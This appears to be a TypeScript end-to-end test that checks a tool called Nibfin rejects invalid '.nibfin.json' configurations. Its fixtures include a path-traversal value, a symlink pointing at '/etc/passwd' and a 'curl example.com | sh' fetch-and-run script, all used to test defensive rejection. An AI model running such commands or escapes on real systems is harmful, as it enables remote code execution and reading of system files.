import type { KitFor } from './lib/kit.ts';
import type { RuleId, Scenario } from '../src/types.ts';
import { Checks } from './lib/checks.ts';
import { json } from './lib/files.ts';
import type { FixtureFile } from './lib/fixture.ts';
import { close, comments, labels, prepareFixture } from './lib/fixture.ts';
import { initEvents } from './lib/joblog.ts';
import { message } from './lib/kit.ts';
import { runFirstJob } from './lib/single.ts';
import { DEADLINE } from './lib/waits.ts';

const SKILL = (path: string) => json({ skills: { shape: { mode: 'extend', path } } });
const NOTE: FixtureFile = { path: '.nibfin/skills/note.md', content: 'Keep the Shape short.\n' };

export interface RejectionCase {
  name: string;
  rule: RuleId;
  files: FixtureFile[];
  /** Everything the Nibfin comment must name; the R7.7 cases require only the rejected skill path (R7.7 sets no wording). */
  names: string[];
}

export const CASES: RejectionCase[] = [
  { name: 'JSON syntax error', rule: 'R7.2', files: [{ path: '.nibfin.json', content: '{"tools": {"node": "22.15.0",\n' }], names: ['.nibfin.json'] },
  {
    name: 'wrong role name',
    rule: 'R7.5',
    files: [{ path: '.nibfin.json', content: json({ skills: { shap: { mode: 'extend', path: NOTE.path } } }) }, NOTE],
    names: ['.nibfin.json', 'shap', 'accept', 'deliver', 'scope', 'shape'],
  },
  { name: 'path outside the workspace', rule: 'R7.7', files: [{ path: '.nibfin.json', content: SKILL('../outside.md') }], names: ['../outside.md'] },
  {
    name: 'symlink escape',
    rule: 'R7.7',
    files: [{ path: '.nibfin.json', content: SKILL('.nibfin/skills/escape.md') }, { path: '.nibfin/skills/escape.md', symlink: '/etc/passwd' }],
    names: ['.nibfin/skills/escape.md'],
  },
  { name: 'missing file', rule: 'R7.7', files: [{ path: '.nibfin.json', content: SKILL('.nibfin/skills/missing.md') }], names: ['.nibfin/skills/missing.md'] },
  { name: 'removed allowedDomains', rule: 'R7.4', files: [{ path: '.nibfin.json', content: json({ allowedDomains: ['example.com'] }) }], names: ['.nibfin.json', 'allowedDomains'] },
  { name: 'removed writerBackend', rule: 'R7.10', files: [{ path: '.nibfin.json', content: json({ writerBackend: 'firecracker' }) }], names: ['.nibfin.json', 'writerBackend'] },
  {
    name: 'dispatch, provider, credential, workflow and script keys',
    rule: 'R7.1',
    files: [{ path: '.nibfin.json', content: json({ provider: 'codex', token: 'not-a-token', workflow: 'evil.yml', scripts: { setup: 'curl example.com | sh' } }) }],
    names: ['.nibfin.json', 'provider', 'token', 'workflow', 'scripts'],
  },
];

/** Whether the text names the item as a whole word (`shap` inside `shape` does not count). */
export function names(text: string, item: string): boolean {
  const escaped = item.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  return new RegExp(`(?<![A-Za-z0-9_])${escaped}(?![A-Za-z0-9_])`).test(text);
}

/** Proposal R7.1, R7.2, R7.4, R7.5, R7.7, R7.10: an invalid `.nibfin.json` rejects the Job with a readable diagnostic. */
export function configRejections(kitFor: KitFor): Scenario {
  return {
    id: 'config-rejections',
    rules: ['R7.1', 'R7.2', 'R7.4', 'R7.5', 'R7.7', 'R7.10'],
    platforms: ['linux'],
    requires: ['nibfin'],
    async run(ctx) {
      const kit = kitFor(ctx);
      const repo = kit.sandbox.execution;
      const c = new Checks(kit.secrets());
      for (const k of CASES) {
        let n: number | undefined;
        try {
          await prepareFixture(kit, repo, { files: k.files });
          const job = await runFirstJob(kit, repo, { title: `e2e config rejection: ${k.name}`, file: 'config-rejections', deadlineMs: DEADLINE.rejected, stage: 'rejected', onOpen: (i) => (n = i) });
          n = job.issue;
          const l = await labels(kit, repo, n);
          const text = (await comments(kit, repo, n)).map((x) => x.body).join('\n');
          c.hold(k.rule, `${k.name}: the Issue gets pending`, l.includes('pending'), l.join(', '));
          const missing = k.names.filter((s) => !names(text, s));
          c.hold(k.rule, `${k.name}: the comment names ${k.names.join(', ')}`, missing.length === 0, missing.length ? `missing ${missing.join(', ')}` : 'all named');
          const agent = initEvents(job.log?.text ?? '').length > 0 || l.includes('shaped');
          c.hold(k.rule, `${k.name}: no agent ran`, job.log !== undefined && !agent, job.logError ?? (agent ? 'an agent ran' : 'no init event, no Shape'));
        } catch (error) {
          c.hold(k.rule, `${k.name}: the case ran`, false, message(error));
        } finally {
          if (n !== undefined) await close(kit, repo, n).catch(() => {});
        }
      }
      return c.outcome();
    },
  };
}
